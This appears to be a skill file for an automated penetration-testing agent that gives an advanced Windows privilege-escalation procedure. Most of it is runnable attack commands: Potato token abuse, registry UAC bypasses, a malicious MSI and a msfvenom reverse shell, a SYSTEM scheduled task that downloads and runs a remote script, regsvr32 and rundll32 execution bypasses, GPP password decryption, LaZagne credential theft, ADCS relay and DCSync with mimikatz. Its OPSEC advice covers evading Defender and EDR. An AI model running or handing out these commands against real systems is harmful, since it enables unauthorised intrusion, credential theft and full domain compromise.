---
name: privesc-windows-deep
description: Advanced Windows privilege escalation — token manipulation, Rogue/Juicy/Print/EfsPotato chains, UAC bypass, DLL hijacking with ProcMon, ADCS escalation, Kerberos delegation abuse, and DCSync from limited context
version: 1.0.0
phase: post
category: privilege_escalation
tags: [privesc, windows, kernel, escalation]
tools: [winpeas, mimikatz, powershell, csc, python3]
difficulty: advanced
opsec_level: high
time_estimate: 300s
severity_if_found: critical
related_skills:
  - privesc-windows
  - credential-dump-windows
  - ad-post-exploit
  - ad-kerberos-token-steal
mitre_attack:
  - T1068
  - T1134.001
  - T1134.002
  - T1134.003
  - T1134.004
  - T1134.005
  - T1546.015
  - T1548.002
  - T1552.001
  - T1552.003
  - T1553.002
  - T1574.001
  - T1574.002
  - T1574.010
  - T1053.005
---

## When to Use

Use this skill when basic Windows privesc enumeration (WinPEAS, PowerUp)
found nothing or the path is non-obvious. Covers token abuse with the full
Potato chain, advanced UAC bypass techniques, DLL hijacking with ProcMon,
ADCS (ESC1-ESC8), Kerberos delegation attacks, and DCSync from constrained
contexts.

## Prerequisites

- Shell access (low-privilege) on Windows target
- PowerShell available (minimal language mode acceptable)
- WinPEAS or Seatbelt for initial enumeration
- .NET Framework compiler (csc.exe) for C# tools
- Process Monitor (procmon.exe) for DLL hijacking analysis (offline or brought)
- Network connectivity for Potato-style attacks (if local NTLM relay needed)
- For AD escalation: domain-joined machine, basic domain recon

## Procedure

```powershell
# ──────────────────────────────────────────────
# 1. DEEP PRIVILEGE AND TOKEN AUDIT
# ──────────────────────────────────────────────

# Current token privileges
whoami /priv
whoami /groups
whoami /user

# Check SeImpersonatePrivilege and SeAssignPrimaryToken explicitly
whoami /priv | findstr /i "SeImpersonate"
whoami /priv | findstr /i "SeAssignPrimaryToken"
whoami /priv | findstr /i "SeTcbPrivilege"    # Act as part of OS
whoami /priv | findstr /i "SeBackupPrivilege"
whoami /priv | findstr /i "SeRestorePrivilege"
whoami /priv | findstr /i "SeTakeOwnershipPrivilege"
whoami /priv | findstr /i "SeLoadDriverPrivilege"
whoami /priv | findstr /i "SeDebugPrivilege"

# Token elevation type
powershell -Command "
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$id.TokenInformation.TokenElevationType  # TokenElevationTypeDefault=FullAdmin, Limited, Default
$id.TokenInformation.TokenIsElevated
"

# Check for UAC bypass potential
# If running in a filtered token but can trigger auto-elevation:
# Check integrity level:
whoami /groups | findstr /i "Level" | findstr /i "High\|System"
whoami /groups | findstr /i "Mandatory"

# ──────────────────────────────────────────────
# 2. TOKEN MANIPULATION — POTATO CHAIN
# ──────────────────────────────────────────────

# If SeImpersonatePrivilege is enabled, use the full Potato family

# ── JuicyPotato (CLSID-based, Windows 8/Server 2012) ──
# Download JuicyPotatoNG:
# Upload and execute:
JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami" -l 1337

# Test with specific CLSIDs for different Windows versions:
# Windows 10 1809+: {9DAA8F2B-C622-4E2D-878B-D38EAF43407F} (RuntimeBroker)
JuicyPotatoNG.exe -c "{9DAA8F2B-C622-4E2D-878B-D38EAF43407F}" -t * -l 1337 \
  -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe \
  -a "-EncodedCommand <BASE64_ENCODED_SCRIPT>"

# ── RoguePotato (Windows 10/Server 2016+, most reliable) ──
# Exploits MS-RPCH EptMapper via OxidResolver to trigger NTLM auth
RoguePotato.exe -r 10.0.0.5 -e "powershell -EncodedCommand <BASE64>" -l 1337

# With specific CLSID:
RoguePotato.exe -r 10.0.0.5 -c "{D99E6E74-FC88-11D0-B498-00A0C90312F3}" \
  -e "powershell -EncodedCommand <BASE64>" -l 1337

# ── PrintSpoofer (Windows 10 1809+/Server 2019+, most reliable on modern) ──
# Exploits the print spooler bug (SpoolSample variant)
PrintSpoofer.exe -i -c "whoami"
PrintSpoofer.exe -d 3 -c "powershell -EncodedCommand <BASE64>"

# ── EfsPotato (Windows all, via EfsRpc subsystem) ──
EfsPotato.exe -s cmd.exe
EfsPotato.exe -s powershell.exe

# ── GodPotato (latest, combines techniques, works on Win10/11/Server 2022) ──
GodPotato.exe -cmd "powershell -EncodedCommand <BASE64>"

# ── Automated detection of which potato works ──
# WinPEAS will indicate SeImpersonatePrivilege status
# Test order for modern Windows (10/11/Server 2022):
#   1. GodPotato / EfsPotato (most universal)
#   2. PrintSpoofer (if Spooler is running)
#   3. RoguePotato (if outbound port 135 is available)
#   4. JuicyPotato (legacy, Win8/Server 2012 only)

# ──────────────────────────────────────────────
# 3. SERVICE PERMISSION EXPLOITATION
# ──────────────────────────────────────────────

# ── Unquoted Service Paths ──
# Find all services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i " "
sc query state=all | findstr /i "SERVICE_NAME"
for /f "tokens=2 delims=: " %a in ('sc query state^=all ^| findstr /i "SERVICE_NAME"') do @(
    for /f "tokens=2 delims=: " %b in ('sc qc %a ^| findstr /i "BINARY_PATH_NAME"') do @(
        echo %a: %b | findstr /i /v "c:\windows" | findstr " "
    )
)

# ── Weak Service Permissions ──
# Check which services the current user can modify:
powershell -Command "
$services = Get-WmiObject win32_service | Where-Object { $_.PathName -notlike 'C:\Windows*' }
foreach ($s in $services) {
    $sd = (Get-ItemProperty -Path \"HKLM:\System\CurrentControlSet\Services\$($s.Name)\" -Name 'Security' -ErrorAction SilentlyContinue).Security
    if ($sd) { Write-Host \"$($s.Name) — checking permissions...\" }
}
"

# Using accesschk (Sysinternals):
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula

# ── Service Binary Hijacking ──
# Check if service binaries are writable:
for /f %s in ('wmic service get pathname ^| findstr /i /v "c:\windows" ^| findstr /i .') do (
    icacls "%s" 2>nul | findstr /i "BUILTIN\Users:(W) BUILTIN\Users:(F)"
)

# ──────────────────────────────────────────────
# 4. ALWAYS INSTALL ELEVATED MSI ABUSE
# ──────────────────────────────────────────────

# Check registry keys:
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul

# If both are set to 1, create a malicious MSI:
# On Kali:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
  -f msi -o /tmp/elevated.msi

# Or create a simpler MSI with wix sharp (on target):
# Using Python on Kali:
cat > /tmp/elevated_msi.py << 'PYEOF'
#!/usr/bin/env python3
# Generate a malicious MSI that spawns SYSTEM shell
import base64, os

msi_template = '''
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-123456789012"
           Name="Privesc" Version="1.0.0" Manufacturer="Test" Language="1033">
    <Package InstallScope="perMachine" InstallPrivileges="elevated"
             Compressed="yes" />
    <CustomAction Id="SystemShell" Directory="TARGETDIR" Execute="deferred"
                  Impersonate="no" Return="ignore">
      <Command>cmd.exe /c "net localgroup Administrators <USERNAME> /add"</Command>
    </CustomAction>
    <InstallExecuteSequence>
      <Custom Action="SystemShell" Before="InstallFinalize" />
    </InstallExecuteSequence>
    <Directory Id="TARGETDIR" Name="SourceDir" />
    <Feature Id="Complete" Level="1" />
  </Product>
</Wix>
'''
# Compile with: candle.exe + light.exe (WiX toolset)
print(msi_template)
PYEOF

python3 /tmp/elevated_msi.py > /tmp/privesc.wxs

# Install the MSI (runs as SYSTEM):
msiexec /quiet /qn /i C:\Users\Public\elevated.msi

# ──────────────────────────────────────────────
# 5. UAC BYPASS TECHNIQUES
# ──────────────────────────────────────────────

# ── CMSTP (Microsoft Connection Manager Profile) ──
# Abuses cmstp.exe to auto-elevate by loading an INF file
cat > /tmp/cmstp_bypass.inf << 'XMLEOF'
[version]
Signature=$CHICAGO$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
[RegisterOCXSection]
C:\Windows\System32\windowspowershell\v1.0\powershell.exe
[CORP_DUMMY]
GUID=
SERVER=
USERNAME=
PRERELEASE=
[custom]
dummy=custom
XMLEOF

# Execute with auto-elevation:
cmstp.exe /s /au C:\Users\Public\cmstp_bypass.inf

# ── Fodhelper (Windows 10/11) ──
# Abuses fodhelper.exe which auto-elevates to launch handler
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c whoami > C:\Users\Public\bypass.txt" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
fodhelper.exe
# Clean up:
reg delete "HKCU\Software\Classes\ms-settings" /f

# ── SDCLT (Server Manager, Windows Server) ──
# Works on Server 2008-2022 via sdclt.exe auto-elevation
reg add "HKCU\Software\Classes\exefile\shell\runas\command" /de /f
reg add "HKCU\Software\Classes\exefile\shell\runas\command" /v "" /d "cmd.exe /c whoami > C:\Users\Public\bypass.txt" /f
reg delete "HKCU\Software\Classes\exefile\shell\runas\command" /f

# ── SilentCleanup (via Task Scheduler) ──
# Abuses the SilentCleanup task that runs as elevated
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c whoami > C:\Users\Public\bypass.txt & " /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg delete "HKCU\Environment" /v "windir" /f

# ── UAC bypass with ComputerDefaults (Windows 10/11) ──
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c whoami > C:\Users\Public\bypass.txt" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
computerdefaults.exe
reg delete "HKCU\Software\Classes\ms-settings" /f

# Check UAC level:
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
# 0 = No prompt (UAC off), 2 = Prompt for consent (default), 5 = Prompt for credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
# 0 = UAC disabled, 1 = UAC enabled

# ──────────────────────────────────────────────
# 6. DLL HIJACKING WITH PROCESS MONITOR
# ──────────────────────────────────────────────

# Process Monitor-based DLL Hijacking discovery:
# 1. Run procmon.exe with filter:
#    Process Monitor Filters:
#      - Process Name = <target_app.exe>
#      - Result = NAME NOT FOUND
#      - Path = *.dll
# 2. Launch the target application
# 3. Look for DLL load failures — those paths are hijackable

# Common hijackable targets:
# - System processes: svchost.exe, taskhostw.exe, searchindexer.exe
# - Third-party software: browsers, office, AV products
# - Windows scheduled tasks

# Automated DLL hijacking check with PowerUp:
. .\PowerUp.ps1
Invoke-AllChecks | Where-Object {$_.Type -eq "DLLHijack"}

# Manual check — known service dll hijack:
# Check if any service points to missing DLL:
Get-WmiObject win32_service | Where-Object {
    $_.PathName -match "\.dll" -and $_.PathName -notlike "*C:\Windows*"
} | Select-Object Name, PathName, State

# ──────────────────────────────────────────────
# 7. UNCONSTRAINED DELEGATION ABUSE
# ──────────────────────────────────────────────

# Find computers with unconstrained delegation (any DC/workstation)
powershell -Command "
    $computers = Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
    $computers | Select-Object Name, TrustedForDelegation
"

# If we are admin on a server with unconstrained delegation running as SYSTEM:
# Force a domain admin to connect (e.g., via printer bug or coerce):
# Use SpoolSample or PrinterBug:
SpoolSample.exe <TARGET_DC> <OUR_SERVER_WITH_UNCONSTRAINED_DELEGATION>

# The TGT of the connecting machine account arrives in our LSA cache:
# Extract with Rubeus or Mimikatz:
mimikatz.exe "sekurlsa::tickets /export" exit
# Then inject the ticket:
mimikatz.exe "kerberos::ptt <TICKET_FILE>.kirbi" exit
# Access DC:
dir \\<TARGET_DC>\c$

# ──────────────────────────────────────────────
# 8. GROUP POLICY PREFERENCE PASSWORD EXTRACTION
# ──────────────────────────────────────────────

# Find cached GPP files:
dir /s C:\ProgramData\Microsoft\GroupPolicy\*Groups.xml 2>nul
dir /s %SYSTEMROOT%\SYSVOL\sysvol\*.xml 2>nul

# Extract cpassword from Groups.xml:
# cpassword is AES-encrypted but Microsoft published the private key
# Decryption with Python:
python3 -c "
import sys
from base64 import b64decode
from Crypto.Cipher import AES

# AES key for GPP cpassword decryption
key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

# Decrypt
def decrypt_cpassword(cpassword):
    data = b64decode(cpassword)
    iv = b'\x00' * 16  # GPP uses zero IV
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(data)
    # Remove padding and trailing nulls
    return decrypted.rstrip(b'\x00').rstrip(b'\x07').decode('utf-16-le')

cpassword = sys.argv[1] if len(sys.argv) > 1 else input('Enter cpassword: ')
print(f'Password: {decrypt_cpassword(cpassword)}')
" <CPASSWORD_VALUE>

# ──────────────────────────────────────────────
# 9. SAVED CREDENTIALS DETECTION
# ──────────────────────────────────────────────

# Check stored Windows credentials:
cmdkey /list

# If any saved credentials exist, they can be used:
# runas /savecred /user:<DOMAIN\USER> cmd.exe

# Enumerate stored web credentials:
dir "%APPDATA%\Microsoft\Credentials"
dir "%LOCALAPPDATA%\Microsoft\Credentials"
# Use Mimikatz to decrypt:
mimikatz.exe "dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\<FILE>" exit

# Check for saved RDP connections:
dir /s %USERPROFILE%\Documents\*.rdp 2>nul
# Check credential manager for RDP credentials:
cmdkey /list | findstr "RDP|Terminal|Server"

# Check for saved Wi-Fi credentials:
netsh wlan show profile
netsh wlan show profile <PROFILE> key=clear

# ──────────────────────────────────────────────
# 10. SCHEDULED TASK ABUSE
# ──────────────────────────────────────────────

# List scheduled tasks writable by current user:
schtasks /query /fo LIST /v | findstr /i "TaskName\|Run As User\|Task To Run"

# Tasks running as HIGHEST or SYSTEM with writable actions:
powershell -Command "
$tasks = Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq 'SYSTEM' -or $_.Principal.LogonType -eq 'ServiceAccount' }
foreach ($t in $tasks) {
    foreach ($a in $t.Actions) {
        try {
            $path = if ($a.Path) { $a.Path } else { $a.Execute }
            $canWrite = (Get-Acl $path -ErrorAction SilentlyContinue).Access | Where-Object {
                $_.IdentityReference -match $env:USERNAME
            }
            if ($canWrite) { Write-Output \"WRITABLE: $($t.TaskName) -> $path\" }
        } catch {}
    }
}
"

# Create a new scheduled task as SYSTEM:
schtasks /create /tn "Updater" /tr "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')\"" \
  /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f

# ──────────────────────────────────────────────
# 11. STORED PASSWORD ENUMERATION (LaZagne)
# ──────────────────────────────────────────────

# LaZagne — extract passwords from browsers, email clients, etc.
# Upload and run:
.\laZagne.exe all

# Or use specific modules:
.\laZagne.exe browsers
.\laZagne.exe mails
.\laZagne.exe wifi
.\laZagne.exe databases

# ──────────────────────────────────────────────
# 12. APPLOCKER / CI BYPASS FOR EXECUTION
# ──────────────────────────────────────────────

# Check AppLocker policy:
powershell -Command "Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections"

# Common bypasses when AppLocker blocks .exe/.msi:

# ── .NET based (msbuild.exe) — Compile and run C# inline:
# Place C# source in file.csproj, then:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Users\Public\payload.csproj

# ── InstallUtil bypass:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/ /u C:\Users\Public\payload.dll

# ── regsvr32 bypass (signed Microsoft binary, .sct file):
regsvr32 /u /s /i:http://10.0.0.5/payload.sct scrobj.dll

# ── rundll32 bypass (inline JavaScript):
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64>");

# ── cscript/wscript bypass:
cscript.exe C:\Users\Public\payload.vbs
wscript.exe C:\Users\Public\payload.js

# ── Constrained Language Mode (CLM) bypass:
# Check current mode:
$ExecutionContext.SessionState.LanguageMode

# Bypass via .NET reflection (bypasses CLM but requires some unmanaged access):
# 1. Use System.Management.Automation to manipulate runspace
# 2. Use reflection to call SetSessionStateLanguageMode
# 3. Use PowerShell assembly from disk (unmanaged)
powershell -Command "
    $ps = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
    [System.Management.Automation.Runspaces.Runspace]::DefaultRunspace.SessionStateProxy.LanguageMode = 'FullLanguage'
"

# ──────────────────────────────────────────────
# 13. KERBEROS DELEGATION ABUSE (CONSTRAINED + RESOURCE-BASED)
# ──────────────────────────────────────────────

# ── Resource-Based Constrained Delegation (RBCD) ──
# If we have GenericWrite on a computer object:
# We can set msDS-AllowedToActOnBehalfOfOtherIdentity to allow delegation

# Using PowerView:
Set-DomainObject -Identity <TARGET_COMPUTER>$ -Set @{
    'msDS-AllowedToActOnBehalfOfOtherIdentity' = $delegationSid
}

# Then request a ticket as a domain admin for the target:
Rubeus.exe s4u /user:<OUR_CONTROLLED> /rc4:<HASH> /impersonateuser:Administrator \
  /msdsspn:host/<TARGET_COMPUTER> /ptt

# ── constrained delegation ──
# Find accounts with constrained delegation:
powershell -Command "
    Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo
"

# If we have the hash of a constrained delegation account:
Rubeus.exe s4u /user:<DELEGATION_ACCOUNT> /rc4:<HASH> /impersonateuser:Administrator \
  /msdsspn:time/<TARGET_DC> /altservice:cifs /ptt

# ──────────────────────────────────────────────
# 14. ADCS ESCALATION (ESC1-ESC8)
# ──────────────────────────────────────────────

# Enumerate ADCS (Active Directory Certificate Services)
# ESC1 — Misconfigured certificate templates allow domain escalation

# Check for vulnerable enrolment permissions using Certify:
.\Certify.exe find /vulnerable

# ESC1 criteria:
#   - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set
#   - Manager approval: NOT required
#   - Authorized signatures: NOT required
#   - Low-priv user has enrollment rights

# If vulnerable template found:
.\Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<VULN_TEMPLATE> /altname:Administrator
# Convert to usable format:
.\Rubeus.exe asktgt /user:Administrator /certificate:<BASE64_CERT> /ptt

# ESC2 — Any purpose EKU (no restrictions)
.\Certify.exe find /vulnerable | findstr /i "ESC2"

# ESC3 — Enrollment Agent template abuse
.\Certify.exe find /vulnerable | findstr /i "ESC3"

# ESC4 — Access control vulnerability on certificate template
# ESC5 — PKI object access control
# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
# ESC7 — CA interface access control (requires ManageCA)
# ESC8 — NTLM relay to ADCS Web Enrollment (web enrollment enabled)

# ── ESC8 NTLM relay ──
# On Kali (relay to ADCS):
ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs

# Then coerce authentication:
# On Windows (PetitPotam or SpoolSample):
PetitPotam.exe <ATTACKER_IP> <TARGET_DC>
# On Kali (using dementor.py):
python3 dementor.py -d <DOMAIN> <ATTACKER_IP> <TARGET_DC>

# ──────────────────────────────────────────────
# 15. DCSYNC FROM LIMITED CONTEXT
# ──────────────────────────────────────────────

# DCSync normally requires Domain Admin, Enterprise Admin, or specific rights:
# Replicating Directory Changes (DS-Replication-Get-Changes)
# Replicating Directory Changes All (DS-Replication-Get-Changes-All)
# Replicating Directory Changes In Filtered Set (specifically for filtered set)

# Check if current user has replication rights:
# Use PowerView:
Get-ObjectAcl -DistinguishedName "dc=<DOMAIN>,dc=<TLD>" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "Replicating" -and $_.SecurityIdentifier -eq $env:USERDNSDOMAIN
}

# If we have replication rights (from any context — not just DA):
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:krbtgt" exit
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:Administrator" exit

# With Impacket on Kali (if we have a DA session relayed):
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>

# ──────────────────────────────────────────────
# 16. CREDENTIAL HUNTING IN ACTIVE DIRECTORY
# ──────────────────────────────────────────────

# Search for passwords in SYSVOL:
findstr /s "password" \\<DOMAIN>\SYSVOL\*.xml *.ini *.config 2>nul

# Search for passwords in Group Policy:
findstr /si /m "password" %SYSTEMROOT%\SYSVOL\*.xml 2>nul

# Search for web.config with DB passwords:
dir /s web.config 2>nul

# Search for unattended install files:
dir /s unattend.xml 2>nul
dir /s sysprep.inf 2>nul
dir /s autounattend.xml 2>nul

# Search for passwords in IIS configuration:
type %WINDIR%\System32\inetsrv\config\applicationHost.config | findstr /i "password" 2>nul
```

## OPSEC Rules

- **CRITICAL**: Potato techniques trigger EDR alerts via named pipe creation and NTLM relay
- JuicyPotato is heavily signatured — prefer PrintSpoofer or GodPotato on modern systems
- UAC bypass via registry modifications leaves forensic evidence in NTUSER.DAT
- DCSync is a high-fidelity detection event (Event ID 4662 with Control Access Right)
- ADCS escalation (especially ESC8) generates MS AD CS log events — clean relay chain
- DLL hijacking modifies file system — use empty throwaway DLLs for POC only
- Remove all registry modifications after UAC bypass testing
- AppLocker/CLM bypass may trigger Windows Defender or MDE telemetry
- Mimikatz is heavily signatured — use obfuscated loaders (Invoke-ReflectivePEInjection)
- Do NOT create domain users unless explicitly authorized
- Do NOT persist access via service installations or user creation
- Clean up all transfer artifacts (.exe, .ps1, .dll) after completion

## Verification

- Verify escalation with `whoami /priv` and `whoami /groups` showing SYSTEM or Administrators
- Confirm Potato technique: `whoami` shows `NT AUTHORITY\SYSTEM`
- Verify UAC bypass: check token elevation type changed from Limited to FullAdmin
- Verify DCSync works: extracted hash should decode to valid NTLM format
- Verify ADCS request: certificate should be issued and usable for TGT request
- Verify service exploitation: `sc start <service>` triggers payload execution
- Verify GPP decryption: cpassword should decode to valid domain password
- Test that AppLocker bypass executes payload without blocked prompt
- Verify Kerberos delegation: injected ticket should grant access to target service

## Pitfalls

- Windows Defender Real-time Protection blocks most Potato tools — disable or bypass first
- PrintSpoofer requires the Print Spooler service (spoolsv.exe) to be running
- JuicyPotato is deprecated — does NOT work on Windows 10 1809+ or Server 2019+
- GodPotato requires .NET Framework 4.8 which may not be present
- UAC bypass via registry only works with UAC level 2-5 (NOT with UAC disabled)
- DLL hijacking via ProcMon may find many false positives (system paths are protected)
- ESC1 requires the CA to issue the template (not just enrollment rights)
- ADCS templates vary by domain — always run Certify enumeration before attempting
- Constrained Language Mode blocks most PowerShell commands — use .NET reflection or migrate to cmd
- DCSync generates Event ID 4662 immediately on the Domain Controller
- Service unquoted path exploitation requires restarting the service or rebooting
- Some UAC bypasses (CMSTP, Fodhelper) are patched on recent Win10/11 builds
- Group Policy cpassword only works with cached SYSVOL replicas on DC

## Output Format

```
[TOKEN]   SeImpersonatePrivilege — Enabled (Potato-capable)
[SERVICE] !SVC! — Unquoted path: C:\Program Files\My App\service.exe
[UAC]     ConsentPromptBehaviorAdmin=2 — Bypassable via Fodhelper
[DLL]     C:\Program Files\Vendor\ missing.dll — NAME NOT FOUND, hijackable
[GPP]     cpassword decrypted: S3cur3P@ss! — Domain Admin in Groups.xml
[ADCS]    ESC1 — template "VulnerableTemplate" allows SAN for Administrator
[KERB]    Constrained delegation: SRV-APP$ -> cifs/DC01 (can delegate to file service)
[DCSYNC]  Replication rights available — krbtgt hash extracted
[CLM]     ConstrainedLanguage mode — bypassed via .NET reflection
[LAPS]    LAPS protected — no local admin password exposed
[DELEG]   Unconstrained delegation: SRV-DC02$ — printer bug to force admin auth
[UAC]     Fodhelper bypass executed — elevated shell obtained
[CRITICAL] SeImpersonatePrivilege via PrintSpoofer — NT AUTHORITY\SYSTEM confirmed
```

